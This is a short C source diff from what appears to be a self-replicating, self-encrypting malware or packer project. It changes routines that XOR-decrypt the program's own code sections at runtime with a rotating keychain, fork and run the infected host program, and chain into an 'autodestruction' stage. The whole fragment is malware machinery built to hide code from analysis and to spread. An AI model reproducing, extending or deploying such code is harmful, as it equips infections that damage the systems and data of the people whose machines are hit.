@@ -4,10 +4,10 @@
 /// STATIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
+__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
 {
 	for (register size_t index = 0; index < size; index++)
-		callee[index] ^= keychain->key[RIGHT];
+		callee[index] ^= keychain->key[LEFT];
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -20,13 +20,14 @@ void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	EXIT_LOGGER("autodestruction:\t");
 #endif
 
-	decrypt_right(keychain, (char *)clean, (void *)replicate - (void *)clean);
+	decrypt_left(keychain, (char *)clean, (void *)replicate - (void *)clean);
 
 	if (context == FAILURE)
 		goto label;
 
 	pid_t child;
-	char *av[] = {host->filename, "--help", NULL};
+	char option[] = "--help";
+	char *av[] = {host->filename, option, NULL};
 
 	if ((child = _fork()) < 0)
 	{
@@ -45,8 +46,8 @@ void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	}
 
 label:
-	update_keychain_right(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
-	decrypt_right(keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);
+	update_keychain_left(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
+	decrypt_left(keychain, (char *)autodestruction, (void *)execution - (void *)autodestruction);
 
 	autodestruction(host, keychain, context);
 }
